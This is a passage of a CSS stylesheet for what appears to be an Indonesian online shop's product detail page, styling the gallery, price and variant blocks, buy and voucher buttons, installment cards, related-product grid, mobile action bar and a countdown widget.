  margin:.7rem 0 1.2rem .5rem;
  color:var(--pd-muted);
  overflow:hidden;
}
.pd-breadcrumb a{color:var(--pd-accent);text-decoration:none}
.pd-breadcrumb a:hover{text-decoration:underline}
.pd-breadcrumb a,
.pd-breadcrumb span{flex:0 0 auto}
.pd-breadcrumb .current{
  flex:1 1 auto;
  min-width:0;
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
  font-weight:600;
  color:var(--pd-dark);
  padding-right:2px;
}

/* === Top layout === */
.pd-top-layout{
  display:grid;
  gap:var(--pd-gap);
  grid-template-columns:minmax(260px,340px) minmax(460px,1fr) 300px;
  align-items:start;
  margin-bottom:2.4rem;
}

/* === Media column === */
.pd-media-card{
  background:#fff;
  border:1px solid var(--pd-border);
  border-radius:var(--pd-radius);
  padding:1rem 1rem 1.2rem;
}
.pd-main-image{margin:0 0 .8rem;border:1px solid var(--pd-soft-border);border-radius:10px;overflow:hidden;background:#fff;position:relative}
.pd-main-image img{width:100%;display:block;object-fit:contain;aspect-ratio:1/1}

/* Gallery Thumbnails */
.pd-thumb-gallery{margin-top:.6rem;display:flex;flex-wrap:wrap;gap:.55rem}
.pd-thumb-btn{
  border:1px solid var(--pd-soft-border);
  background:#fff;
  cursor:pointer;
  width:64px;height:64px;padding:2px;
  display:flex;align-items:center;justify-content:center;
  overflow:hidden;border-radius:8px;
  transition:border-color .18s ease, box-shadow .18s ease, transform .18s ease;
  position:relative;
}
.pd-thumb-btn img{max-width:100%;max-height:100%;object-fit:contain;display:block}
.pd-thumb-btn:hover{border-color:var(--pd-accent)}
.pd-thumb-btn.active{border-color:var(--pd-accent);box-shadow:0 0 0 2px rgba(13,110,253,.25)}
.pd-thumb-btn:focus-visible{outline:2px solid var(--pd-accent);outline-offset:2px}
.pd-thumb-btn:active{transform:scale(.96)}

/* === Info column === */
.pd-info-card{
  background:#fff;border:1px solid var(--pd-border);border-radius:var(--pd-radius);
  padding:1.4rem 1.6rem 2rem;
}
.pd-title{margin:0 0 1rem;font-size:1.2rem;line-height:1.25;font-weight:600;color:var(--pd-dark)}
.pd-price-block{margin:0 0 1rem}
.pd-price-row{display:flex;flex-wrap:wrap;align-items:center;gap:.75rem;margin:0 0 .35rem}
.pd-price-current{font-size:2rem;font-weight:700;color:var(--pd-accent)}
.pd-price-original{font-size:.9rem;text-decoration:line-through;color:#94a3b8}
.pd-discount-badge{background:var(--pd-danger);color:#fff;font-size:.68rem;padding:4px 8px 3px;font-weight:600;border-radius:6px;letter-spacing:.5px}
.pd-meta-inline{display:flex;flex-wrap:wrap;gap:.9rem;align-items:center;font-size:.63rem;letter-spacing:.6px;text-transform:uppercase;font-weight:600}
.stock-badge{padding:4px 10px;border-radius:24px;background:var(--pd-soft);color:var(--pd-muted);display:inline-block;line-height:1;vertical-align:middle}
.stock-badge.in{background:var(--pd-success-bg);color:var(--pd-success-text)}
.stock-badge.out{background:var(--pd-danger-bg);color:var(--pd-danger-text)}
.digital-badge{padding:4px 10px;border-radius:24px;background:linear-gradient(135deg,#8adeff 0%,#764ba2 100%);color:#fff;font-size:.63rem;font-weight:600;letter-spacing:.6px;text-transform:uppercase;display:inline-block;line-height:1;vertical-align:middle;border:none}
.sku{color:var(--pd-muted)}
.pd-short-desc{font-size:.85rem;line-height:1.5;margin:0 0 1.2rem;color:#334155;overflow-wrap:anywhere}
.pd-short-desc p{margin:0 0 .75rem}
.pd-short-desc ul,.pd-short-desc ol{margin:.5rem 0 .9rem 1.1rem;font-size:.85rem;line-height:1.45}

/* Meta row for sold and rating badges */
.pd-meta-row {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 5px;
  margin-top: 8px;
  margin-bottom: 4px;
}

/* Sales (Terjual) badge inline */
.sold-inline{
  display:inline-block;font-size:.65rem;font-weight:600;color:#475569;
  background:#f1f5f9;padding:3px 8px 4px;border-radius:6px;letter-spacing:.4px;margin-left:0;
}

/* Price row divider */
.price-divider {
  display: inline-block;
  margin: 0 .4rem;
  color: #cbd5e1;
  font-weight: 400;
}

/* Rating badge inline */
.rating-inline {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 8px 4px;
  background: #fff7ed;
  border-radius: 6px;
  font-size: .65rem;
  font-weight: 600;
  color: #8adeff;
  text-decoration: none;
  transition: all .2s ease;
  cursor: pointer;
  margin-left: .5rem;
  white-space: nowrap;
}

.rating-inline:hover {
  background: #ffedd5;
  transform: translateY(-1px);
  box-shadow: 0 2px 4px rgba(234, 88, 12, 0.1);
}

.rating-inline .star-icon {
  font-size: .75rem;
  color: #8adeff;
  line-height: 1;
}

.rating-inline .rating-value {
  color: #8adeff;
}

.rating-inline .rating-badge-count {
  color: #8adeff;
  opacity: 0.85;
}

@media (max-width: 640px) {
  .rating-inline {
    font-size: .65rem;
    padding: 3px 8px 4px;
  }
  .rating-inline .star-icon {
    font-size: .7rem;
  }
}

/* Highlight animation for review section */
@keyframes highlightFlash {
  0%, 100% { background-color: transparent; }
  50% { background-color: rgba(251, 146, 60, 0.1); }
}

.highlight-flash {
  animation: highlightFlash 1.5s ease;
}

/* === Variant chips === */
.pd-variants{margin-top:14px}
.v-group{margin-bottom:12px}
.v-label{font-weight:600;margin-bottom:6px}
.v-options{display:flex;flex-wrap:wrap;gap:8px}
.v-chip{
  display:inline-flex;align-items:center;gap:8px;
  padding:6px 10px;border:1px solid #d6d9de;border-radius:999px;
  cursor:pointer;background:#fff;transition:.15s ease;user-select:none
}
.v-chip:hover{border-color:#9aa3af;box-shadow:0 1px 0 rgba(0,0,0,.04)}
.v-chip.selected{border-color:#2563eb;background:#eff6ff}
.v-chip.disabled{opacity:.45;cursor:not-allowed}
.v-chip.out{border-style:dashed}
.v-chip input{display:none}
.v-chip .dot{width:14px;height:14px;border-radius:50%;background:var(--dot,#999);box-shadow:inset 0 0 0 1px rgba(0,0,0,.2)}
.v-chip .dot--neutral{background:#9aa3af}
.v-chip .txt{font-size:.95rem;white-space:nowrap}
.v-chip .chip-badge{margin-left:2px;font-size:.72rem;line-height:1;padding:3px 6px;border-radius:6px;background:#fee2e2;color:#8adeff;border:1px solid #8adeff}
.pd-variant-summary{margin-top:8px;color:#475569;font-size:.92rem}
.pd-variant-summary .vs-item{display:inline-flex;gap:4px;margin-right:10px}

/* === Buy form (di sidebar kanan untuk desktop) === */
.pd-buy-form{display:flex;flex-wrap:wrap;align-items:flex-end;gap:1rem 1.4rem;margin:0}
.qty-label{display:block;font-size:.6rem;font-weight:600;letter-spacing:.7px;text-transform:uppercase;color:var(--pd-muted);margin-bottom:.35rem}
.pd-buy-form input[type=number]{width:90px;padding:.55rem .6rem;border:1px solid var(--pd-soft-border);border-radius:6px;font-size:.85rem}
.pd-actions{display:flex;gap:.8rem;flex-wrap:wrap}

/* Tombol senada tema */
.btn-add-cart,.btn-buy,.btn-chat-icon{
  cursor:pointer;border:0;font-weight:700;border-radius:10px;font-size:.9rem;
  display:inline-flex;align-items:center;justify-content:center;gap:.4rem;
  min-height:44px;padding:0 1rem;transition:var(--pd-transition)
}
.btn-add-cart{background:var(--brand-500);color:#fff;box-shadow:0 2px 8px -2px rgba(13,110,253,.35)}
.btn-add-cart:hover{filter:brightness(.95)}
.btn-buy{background:#fff;color:var(--brand-500);border:2px solid var(--brand-500)}
.btn-buy:hover{background:rgba(13,110,253,.06)}
.btn-chat-icon{background:#fff;color:#8adeff;border:2px solid #8adeff;padding:0;width:44px;min-width:44px}
.btn-chat-icon:hover{background:rgba(251, 146, 60, 0.06);border-color:#8adeff}
.btn-chat-icon svg{width:20px;height:20px;flex-shrink:0}
.btn-add-cart:disabled,.btn-buy:disabled,.btn-chat-icon:disabled{opacity:.5;cursor:not-allowed}

/* Buy with Voucher Button - Cleaner, more compact design */
.btn-buy-voucher{
  cursor:pointer;border:0;font-weight:600;border-radius:10px;
  display:inline-flex;align-items:center;justify-content:space-between;gap:10px;
  min-height:44px;padding:0 14px 0 12px;transition:all 0.3s ease;
  background:linear-gradient(135deg, #7c3aed 0%, #9333ea 100%);
  color:#fff;
  box-shadow:0 3px 10px rgba(124,58,237,0.3);
  position:relative;
  overflow:hidden;
  flex:1 1 auto
}
.btn-buy-voucher:hover{
  transform:translateY(-2px);
  box-shadow:0 5px 16px rgba(124,58,237,0.4)
}
.btn-buy-voucher:active{
  transform:translateY(0);
  box-shadow:0 2px 6px rgba(124,58,237,0.3)
}
.btn-buy-voucher .bv-icon{
  font-size:20px;
  line-height:1;
  flex-shrink:0
}
.btn-buy-voucher .bv-text{
  display:flex;
  flex-direction:column;
  align-items:flex-start;
  gap:2px;
  flex:1;
  min-width:0;
  font-size:14px;
  line-height:1.2
}
.btn-buy-voucher .bv-text small{
  font-size:10px;
  opacity:0.85;
  font-weight:500;
  letter-spacing:0.3px;
  font-family:monospace
}
.btn-buy-voucher .bv-save{
  font-size:12px;
  font-weight:700;
  background:rgba(255,255,255,0.25);
  padding:4px 8px;
  border-radius:6px;
  white-space:nowrap;
  flex-shrink:0
}

/* Extra meta (opsional) */
.pd-extra-meta{background:var(--pd-soft);border:1px solid var(--pd-border);border-radius:10px;padding:.85rem 1rem;display:grid;gap:.45rem;font-size:.7rem;line-height:1.3}
.pd-extra-meta span{font-weight:600;color:var(--pd-muted);margin-right:.3rem}
.pd-extra-meta a{color:var(--pd-accent);text-decoration:none}
.pd-extra-meta a:hover{text-decoration:underline}

/* === Sidebar === */
.pd-sidebar{display:flex;flex-direction:column;gap:1.2rem}
.pd-side-card{background:#fff;border:1px solid var(--pd-border);border-radius:var(--pd-radius);padding:1rem 1.1rem 1.2rem}
.pd-side-card h3{margin:0 0 .7rem;font-size:.8rem;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:var(--pd-dark)}
.pd-side-card ul{list-style:none;margin:0;padding:0;display:grid;gap:.45rem;font-size:.7rem;color:#334155}
.pd-side-card li{position:relative;padding-left:13px;line-height:1.25}
.pd-side-card li:before{content:'';width:6px;height:6px;background:var(--pd-accent);border-radius:50%;position:absolute;left:0;top:.45rem}
.pay-logos{display:flex;gap:.4rem;flex-wrap:wrap;margin:.1rem 0 .4rem}
.pay-logos span{font-size:.55rem;background:var(--pd-soft);border:1px solid var(--pd-soft-border);padding:.35rem .55rem;border-radius:6px;font-weight:600;letter-spacing:.5px}

/* Buy card hanya desktop (mobile pakai FAB) */
.pd-buy-card{display:block}
@media (max-width:880px){ .pd-buy-card{display:none} .pd-title-row {padding-right: 0 !important;}}

/* === Full Description === */
.pd-full-description{background:#fff;border:1px solid var(--pd-border);border-radius:var(--pd-radius);padding:1.6rem 1.9rem .6rem;margin:0 0 .8rem}
.pd-full-desc-title{margin:0 0 1.1rem;font-size:1.15rem;font-weight:600;color:var(--pd-dark)}
.pd-full-desc-body{font-size:.9rem;line-height:1.6;color:#334155;overflow-wrap:anywhere}
.pd-full-desc-body p{margin:0 0 1rem}
.pd-full-desc-body ul,.pd-full-desc-body ol{margin:.5rem 0 1rem 1.2rem}
.pd-full-desc-body table{width:100%;border-collapse:collapse;margin:1rem 0 1.2rem}
.pd-full-desc-body table,.pd-full-desc-body th,.pd-full-desc-body td{border-bottom:1px dotted #cbd5e1;vertical-align: top}
.pd-full-desc-body th,.pd-full-desc-body td{padding:.45rem .55rem;text-align:left}
.pd-full-desc-body img{max-width:100%;height:auto;display:block;}

/* === Related (container) === */
.pd-related-full{
  background:#fff;border:1px solid var(--pd-border);
  border-radius:var(--pd-radius);padding:1.4rem 1.6rem 1.9rem;
  margin:0 0 2rem;
}
.pd-related-title{margin:0 0 1.1rem;font-size:1.05rem;font-weight:600;color:var(--pd-dark)}

/* Related Grid (dirapikan: gabung selector agar tidak duplikat) */
.pd-related-grid,
.pd-related-grid--full{
  display:grid !important;
  gap:16px !important;
  grid-template-columns:repeat(auto-fill,minmax(170px,1fr)) !important;
  align-items:stretch;
}

/* Fallback jika grid tidak didukung */
@supports not (display:grid){
  .pd-related-grid,
  .pd-related-grid--full{display:flex !important;flex-wrap:wrap}
  .pd-related-grid .pd-related-card,
  .pd-related-grid--full .pd-related-card{flex:0 0 calc(20% - 16px);max-width:calc(20% - 16px)}
  @media (max-width:1100px){
    .pd-related-grid .pd-related-card,
    .pd-related-grid--full .pd-related-card{flex:0 0 calc(25% - 16px);max-width:calc(25% - 16px)}
  }
  @media (max-width:820px){
    .pd-related-grid .pd-related-card,
    .pd-related-grid--full .pd-related-card{flex:0 0 calc(33.333% - 16px);max-width:calc(33.333% - 16px)}
  }
  @media (max-width:580px){
    .pd-related-grid .pd-related-card,
    .pd-related-grid--full .pd-related-card{flex:0 0 calc(50% - 16px);max-width:calc(50% - 16px)}
  }
}

/* Related Card */
.pd-related-card{
  display:flex;flex-direction:column;border:1px solid var(--pd-soft-border);
  background:#fff;border-radius:10px;text-decoration:none;color:inherit;
  overflow:hidden;transition:var(--pd-transition);position:relative;min-width:0;
}
.pd-related-card:hover{transform:translateY(-4px);box-shadow:var(--pd-shadow)}
.pd-related-card .thumb{aspect-ratio:1/1;background:#f1f5f9;overflow:hidden;position:relative}
.pd-related-card img{width:100%;height:100%;object-fit:cover;display:block}
.mini-disc{position:absolute;top:6px;left:6px;background:#8adeff;color:#fff;font-size:.55rem;padding:3px 6px 2px;border-radius:4px;font-weight:600}
.pd-related-card .info{padding:.55rem .65rem .75rem;display:flex;flex-direction:column;gap:.25rem}
.pd-related-card h3{font-size:.68rem;line-height:1.25;margin:0;height:2.5em;overflow:hidden;font-weight:600;color:#334155;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
.pd-related-card .price{font-size:.7rem;font-weight:600;color:var(--pd-accent)}
.pd-related-card .sold{display:block;font-size:.6rem;font-weight:600;color:#475569;margin-top:2px;letter-spacing:.3px;background:#f1f5f9;padding:2px 6px 3px;border-radius:5px; width: max-content;}
.pd-related-card .price .final {font-size: .82rem; font-weight: 700; color: #0d6efd;}
.pd-related-card .price .ori {font-size: .6rem; text-decoration: line-through; color: #94a3b8;font-weight: 500;}

/* === Mobile slider (scroll-snap) â€” gambar utama tetap tampil === */
.pd-mobile-slider{display:none}
.pd-mobile-slider img{width:100%;display:block;object-fit:contain;aspect-ratio:1/1}

/* Gallery counter badge */
.pd-gallery-counter{
  position:absolute;
  bottom:12px;
  left:12px;
  background:rgba(255,255,255,0.25);
  color:#9E9E9E;
  padding:4px 10px;
  border-radius:10px;
  font-size:12px;
  font-weight:600;
  z-index:100;
  backdrop-filter:blur(6px);
  -webkit-backdrop-filter:blur(6px);
  font-variant-numeric:tabular-nums;
  pointer-events:none;
  display:none;
  box-shadow:0 1px 4px rgba(0,0,0,.15);
  line-height:1;
  border:1px solid rgba(0,0,0,0.08);
}

@media (max-width:640px){
  .pd-media-card{border: 0;padding: 0 1rem 0;}
  .pd-info-card {border: 0; padding: 0 1.3rem 0; }
  .pd-side-card {flex: 1 1 !important;}
  .pd-top-layout {gap: 0; margin-bottom: 0;}
  .pd-variants {margin-bottom: 1.5rem;}
  .pd-main-image{display:none}
  .pd-gallery-counter{display:block}
  .pd-mobile-slider-wrapper{
    position:relative;
    margin-bottom:.6rem;
  }
  .pd-mobile-slider{
    display:flex;gap:8px;overflow-x:auto;
    scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;
  }
  .pd-mslide{
    min-width:100%;flex:0 0 100%;scroll-snap-align:center;
    border:1px solid var(--pd-soft-border);border-radius:10px;overflow:hidden;background:#fff
  }
  .pd-thumb-gallery{display:none} /* hide thumbnails on mobile */
}

/* === Mobile Floating Action Bar === */
.pd-mobile-fab{
  position:fixed;
  left:0;
  right:0;
  bottom:42px; /* Position above bottom-nav (60px min-height + 6px padding) */
  display:none;
  align-items:center;
  gap:.75rem;
  padding:12px 16px;
  background:rgba(255,255,255,0.95);
  backdrop-filter:blur(20px);
  -webkit-backdrop-filter:blur(20px);
  border-top:1px solid rgba(228,231,235,0.6);
  box-shadow:0 -4px 16px -4px rgba(0,0,0,0.12);
  z-index:999; /* Below bottom-nav (1000) */
  transition:bottom .3s cubic-bezier(0.4, 0.0, 0.2, 1);
}

/* When bottom-nav is hidden, move FAB to bottom */
body:has(.bottom-nav.hidden) .pd-mobile-fab {
  bottom: 0;
}
.pd-mobile-fab .mf-actions{display:flex;gap:.5rem;width:100%}
.mf-btn{
  border-radius:10px;
  padding:.6rem 1rem;
  font-weight:600;
  font-size:14px;
  cursor:pointer;
  transition:all .2s;
  -webkit-tap-highlight-color:transparent;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  gap:4px;
}
.mf-buy{
  background:#8adeff;
  color:#fff;
  border:0;
  box-shadow:0 2px 8px rgba(251, 146, 60, 0.3);
  flex:1;
  flex-direction:column;
  padding:.55rem 1rem;
  line-height:1;
  min-height:44px;
  font-family:inherit;
}
.mf-buy .mf-buy-text{
  font-size:11px;
  font-weight:600;
  opacity:0.95;
  font-family:inherit;
}
.mf-buy .mf-buy-price{
  font-size:13px;
  font-weight:800;
  letter-spacing:-0.3px;
  font-family:inherit;
  line-height:1;
}
.mf-buy:active{transform:scale(0.97)}
.mf-cart{
  background:#fff;
  color:#8adeff;
  border:2px solid #8adeff;
  width:44px;
  height:44px;
  min-height:44px;
  padding:0;
  flex-shrink:0;
  font-family:inherit;
}
.mf-cart:active{transform:scale(0.95)}
.mf-chat{background:#fff;color:#8adeff;border:2px solid #8adeff;width:44px;height:44px;min-height:44px;padding:0;flex-shrink:0;font-family:inherit}
.mf-chat:active{transform:scale(0.95)}
.mf-chat svg{width:20px;height:20px;flex-shrink:0}
.mf-share{
  background:#fff;
  color:#8adeff;
  border:2px solid #8adeff;
  width:44px;
  height:44px;
  padding:0;
  flex-shrink:0;
}
.mf-share:active{transform:scale(0.95)}
.mf-btn:disabled{opacity:.5;cursor:not-allowed}
@media (max-width:640px){
  .pd-mobile-fab{display:flex}
  .product-single{padding-bottom:0;} /* Space for FAB + bottom-nav */
}

/* === Installment cards === */
.pd-installment-card{border:1px solid var(--pd-border);background:#fff;border-radius:var(--pd-radius);padding:1rem 1.1rem 1.25rem;display:flex;flex-direction:column;gap:.85rem}
.pd-installment-card h3{margin:0 0 .2rem;font-size:.78rem;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:var(--pd-dark)}

.inst-tabs{display:flex;gap:.4rem}
.inst-tab{flex:1 1 0;background:var(--pd-soft);border:1px solid var(--pd-soft-border);padding:.45rem .5rem;font-size:.63rem;font-weight:600;border-radius:6px;cursor:pointer;letter-spacing:.4px;transition:var(--pd-transition)}
.inst-tab.active,.inst-tab:hover{background:var(--pd-accent);color:#fff;border-color:var(--pd-accent)}
.inst-tab:focus{outline:2px solid var(--pd-accent);outline-offset:2px}

.inst-tenors{display:flex;gap:.4rem;flex-wrap:wrap}
.tenor-btn{flex:1 0 auto;background:#fff;border:1px solid var(--pd-soft-border);padding:.42rem .55rem;font-size:.6rem;font-weight:600;border-radius:20px;cursor:pointer;transition:.18s;min-width:56px}
.tenor-btn.active,.tenor-btn:hover{background:#1d7df0;color:#fff;border-color:#1d7df0}

.inst-result{display:flex;flex-direction:column;gap:.45rem;font-size:.63rem}
.inst-line{display:flex;justify-content:space-between;align-items:center;padding:.35rem .55rem;background:var(--pd-soft);border:1px solid var(--pd-soft-border);border-radius:6px}
.inst-line.highlight{background:#1d7df0;color:#fff;border-color:#1d7df0;font-weight:600}
.inst-line .lbl{opacity:.8}
.inst-line .val{font-weight:600;letter-spacing:.3px}
.inst-footnote{font-size:.53rem;line-height:1.25;color:#64748b;margin-top:.2rem}
@media (max-width: 860px){
  .pd-installment-card{order:3}
  .inst-tabs .inst-tab,.inst-tenors .tenor-btn{font-size:.65rem}
  
  /* Voucher button responsive - make it simpler */
  .btn-buy-voucher{
    padding:0 12px;
    gap:8px
  }
  .btn-buy-voucher .bv-icon{
    font-size:18px
  }
  .btn-buy-voucher .bv-text{
    font-size:13px
  }
  .btn-buy-voucher .bv-text small{
    font-size:9px
  }
  .btn-buy-voucher .bv-save{
    font-size:11px;
    padding:3px 6px
  }
}

/* Installment List v2 (eye-catching) */
.pd-installment-card2{
  background:linear-gradient(135deg,#ffffff 0%,#f1f7ff 65%,#e8f2ff 100%);
  border:1px solid var(--pd-border);border-radius:var(--pd-radius);
  padding:1rem 1.05rem 1.2rem;display:flex;flex-direction:column;gap:.5rem;
  position:relative;overflow:hidden
}
.pd-installment-card2:before{
  content:'';position:absolute;width:140px;height:140px;
  background:radial-gradient(circle at center,rgba(29,125,240,.18),rgba(29,125,240,0));
  top:-40px;right:-40px;pointer-events:none
}
.pd-installment-card2 h3{margin:0;font-size:.8rem;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:#0f2f54}
.pd-installment-card2 .inst-head{display:flex;align-items:center;justify-content:space-between;gap:.5rem}
.inst-head-badge{background:#1d7df0;color:#fff;font-size:.55rem;font-weight:600;padding:.25rem .5rem;border-radius:20px;letter-spacing:.4px;box-shadow:0 2px 6px -2px rgba(29,125,240,.6)}

.inst-bank-tabs{display:flex;gap:.45rem}
.bank-tab{flex:1 1 0;background:#fff;border:1px solid var(--pd-soft-border);padding:.5rem .55rem;font-size:.63rem;font-weight:600;border-radius:7px;cursor:pointer;transition:.18s;letter-spacing:.3px}
.bank-tab.active,.bank-tab:hover{background:#1d7df0;color:#fff;border-color:#1d7df0;box-shadow:0 3px 10px -4px rgba(29,125,240,.6)}
.bank-tab:focus{outline:2px solid #1d7df0;outline-offset:2px}

.inst-month-list{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:.55rem}
.inst-month-item{display:flex;align-items:center;gap:.65rem;background:#fff;border:1px solid var(--pd-soft-border);border-radius:14px;padding:.55rem .7rem;position:relative;overflow:hidden;transition:.25s}
.inst-month-item:before{content:'';position:absolute;inset:0;opacity:0;background:linear-gradient(90deg,rgba(29,125,240,.08),rgba(29,125,240,0));transition:.25s}
.inst-month-item:hover{transform:translateY(-2px);box-shadow:0 6px 14px -6px rgba(0,40,120,.25)}
.inst-month-item:hover:before{opacity:1}
.tenor-badge{background:#1d7df0;color:#fff;font-weight:700;min-width:42px;text-align:center;padding:.38rem .4rem;font-size:.8rem;border-radius:10px;box-shadow:0 3px 10px -4px rgba(29,125,240,.6)}
.amount{flex:1;font-size:.8rem;font-weight:600;color:#0f2f54;letter-spacing:.3px}
.tag{font-size:.55rem;font-weight:600;padding:.28rem .55rem;border-radius:30px;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap}
.tag-zero{background:#16a34a;color:#fff;box-shadow:0 2px 8px -3px rgba(16,180,90,.55)}

.inst-note{font-size:.6rem;font-weight:600;color:#0f2f54;background:#e0f7ed;border:1px solid #b2ebd2;padding:.4rem .6rem;border-radius:8px;letter-spacing:.3px}
.inst-disclaimer{font-size:.52rem;line-height:1.25;color:#64748b;margin-top:-.2rem}

@media (max-width:860px){
  .pd-installment-card2{order:3}
  .tenor-badge{min-width:38px;font-size:.75rem}
  .amount{font-size:.78rem}
}

/* Alt Fintech Banner (compact) */
.inst-alt-banner--compact{
  background:linear-gradient(142deg,#1d7df0 0%,#3c98ff 55%,#67bdff 100%);
  color:#fff;border:0;padding:.95rem .95rem 1.05rem;border-radius:16px;
  box-shadow:0 6px 18px -6px rgba(0,70,160,.45);position:relative;overflow:hidden;min-height:auto;
}
.inst-alt-banner--compact:before,
.inst-alt-banner--compact:after{
  content:'';position:absolute;border-radius:50%;background:rgba(255,255,255,.15);filter:blur(2px);pointer-events:none;
}
.inst-alt-banner--compact:before{width:130px;height:130px;top:-50px;right:-35px}
.inst-alt-banner--compact:after{width:90px;height:90px;bottom:-40px;left:-30px}
.inst-alt-banner--compact .iab-top{margin:0 0 .55rem;display:flex;flex-direction:column;gap:.25rem}
.inst-alt-banner--compact .iab-title{font-size:.74rem;font-weight:700;letter-spacing:.7px;line-height:1.15}
.inst-alt-banner--compact .iab-sub{font-size:.55rem;font-weight:500;opacity:.95;letter-spacing:.4px}

.iab-logos-compact{display:flex;gap:.55rem;align-items:center;margin:0 0 .6rem;flex-wrap:nowrap;justify-content:space-between}
.iab-logos-compact .logo-fin{width:30%}
.iab-logos-compact .logo{
  width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;
  font-size:.62rem;font-weight:700;letter-spacing:.3px;position:relative;color:#fff;
  box-shadow:0 4px 10px -4px rgba(0,0,0,.35);background:rgba(255,255,255,.15);
  backdrop-filter:blur(4px);transition:.25s;text-shadow:0 1px 2px rgba(0,0,0,.4);user-select:none;
}
.iab-logos-compact .logo:before{
  content:'';position:absolute;inset:0;border-radius:inherit;
  background:linear-gradient(140deg,rgba(255,255,255,.35),rgba(255,255,255,0));mix-blend-mode:overlay;opacity:.55;pointer-events:none;
}
.iab-logos-compact .logo:hover{transform:translateY(-3px) scale(1.05);box-shadow:0 8px 18px -6px rgba(0,0,0,.45)}

.iab-cta--compact{
  display:inline-flex;padding:.45rem .85rem;font-size:.58rem;font-weight:700;background:#fff;color:#0f3c6d;border-radius:30px;text-decoration:none;letter-spacing:.55px;box-shadow:0 4px 12px -5px rgba(0,0,0,.35);transition:.25s;
}
.iab-cta--compact:hover{transform:translateY(-2px);box-shadow:0 8px 18px -7px rgba(0,0,0,.45)}
.iab-footnote--compact{margin-top:.45rem;font-size:.46rem;opacity:.85;letter-spacing:.25px}
@media (max-width:860px){
  .inst-alt-banner--compact{order:4;margin-top:.4rem;flex:1 1}
  .iab-logos-compact .logo{width:46px;height:46px}
}

/* === Scroll To Top (baru) === */
.pd-scroll-top{
  position:fixed;
  right:20px;
  bottom:90px;
  width:48px;
  height:48px;
  border-radius:50%;
  background:linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
  color:#0f2f54;
  border:1px solid rgba(226, 232, 240, 0.8);
  box-shadow:0 8px 20px -8px rgba(0,0,0,.3), 0 2px 6px rgba(0,0,0,.1);
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  z-index:1105;
  opacity:0;
  transform:translateY(12px) scale(.92);
  transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
  backdrop-filter:blur(8px);
  -webkit-backdrop-filter:blur(8px);
}
.pd-scroll-top:hover{
  box-shadow:0 12px 28px -10px rgba(0,0,0,.4), 0 4px 12px rgba(0,0,0,.15);
  transform:translateY(0) scale(1);
  background:linear-gradient(135deg, #ffffff 0%, #fefefe 100%);
  border-color:rgba(226, 232, 240, 1);
}
.pd-scroll-top:active{
  transform:translateY(0) scale(.96);
}
.pd-scroll-top:focus-visible{outline:2px solid var(--pd-accent);outline-offset:2px}
.pd-scroll-top.visible{opacity:1;transform:translateY(0) scale(1)}
@media (max-width:640px){
  /* Dynamic positioning via JavaScript */
  .pd-scroll-top{
    right:14px;
    bottom:var(--scroll-top-bottom, calc(68px + 18px + env(safe-area-inset-bottom)));
  }
}

/* === Responsive layout tweaks === */
@media (max-width:1250px){
  .pd-top-layout{grid-template-columns:minmax(260px,330px) 1fr}
  .pd-sidebar{grid-column:1 / -1;flex-direction:row;flex-wrap:wrap;gap:1rem}
  /* Other cards 2-per-row; buy card always takes full row to avoid height-mismatch gaps */
  .pd-side-card{flex:1 1 calc(50% - .5rem)}
  .pd-buy-card{flex:0 0 100%}
}
@media (max-width:880px){
  .pd-top-layout{grid-template-columns:1fr}
  .pd-sidebar{flex-direction:column; padding: 0 1rem;}
  .pd-title{font-size:1.2rem}
  .pd-price-current{font-size:1.5rem}
}
@media (max-width:640px){
  /* Related: 2 kolom di mobile */
  .pd-related-full{padding:1.2rem;border:0;padding-top: .6rem;margin-bottom:.6rem;}
  .pd-related-grid,.pd-related-grid--full{grid-template-columns:repeat(2,1fr) !important;gap:12px !important}
}
@media (max-width:560px){
  .pd-actions{flex-direction:column}
  .btn-add-cart,.btn-buy,.btn-buy-voucher{width:100%}
  .pd-full-description{padding:1.2rem;border:0;padding-bottom:0;}
}
@media (max-width:380px){
  .pd-related-full{padding:.9rem .7rem 1.1rem}
  .pd-related-grid,.pd-related-grid--full{gap:8px !important}
  .pd-related-card .info{padding:.4rem .48rem .55rem}
}

/* === Modern Countdown (Product Detail) === */
.pd-countdown-modern{
  --cd-bg1:#0ea5e9;          /* sky-500 */
  --cd-bg2:#6366f1;          /* indigo-500 */
  --cd-text:#0b1220;
  --cd-contrast:#ffffff;
  --cd-shadow: 0 8px 24px -10px rgba(0,0,0,.25);
  --cd-border: rgba(255,255,255,.25);
  --cd-box: rgba(255,255,255,.65);
  --cd-box-text:#0f172a;
  --cd-danger:#8adeff;

  display:flex; gap:.75rem; align-items:center;
  background:linear-gradient(135deg,var(--cd-bg1),var(--cd-bg2));
  border:1px solid var(--cd-border);
  color:var(--cd-contrast);
  border-radius:14px;
  padding:.6rem .8rem;
  box-shadow:var(--cd-shadow);
  position:relative;
  overflow:hidden;
  margin-bottom: 1rem;
}

.pd-countdown-modern .pd-cd-icon{
  width:28px;height:28px;flex:0 0 28px;
  display:grid;place-items:center;
  background:rgba(255,255,255,.22);
  border:1px solid var(--cd-border);
  border-radius:10px;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.35);
}
.pd-countdown-modern .pd-cd-icon svg{width:18px;height:18px;fill:#fff;opacity:.95}

.pd-countdown-modern .pd-cd-body{display:flex;flex-direction:column;gap:.35rem;min-width:0}

.pd-countdown-modern .pd-cd-label{
  font-size:.72rem;font-weight:700;letter-spacing:.4px;opacity:.95;line-height:1;
  text-shadow:0 1px 0 rgba(0,0,0,.08);
}

.pd-countdown-modern .pd-cd-time{
  display:flex; align-items:end; gap:.35rem; flex-wrap:wrap;
  line-height:1;
}

.pd-countdown-modern .unit{
  display:flex; flex-direction:column; align-items:center; gap:.18rem;
  min-width:58px;
}
.pd-countdown-modern .num{
  display:inline-flex; align-items:center; justify-content:center;
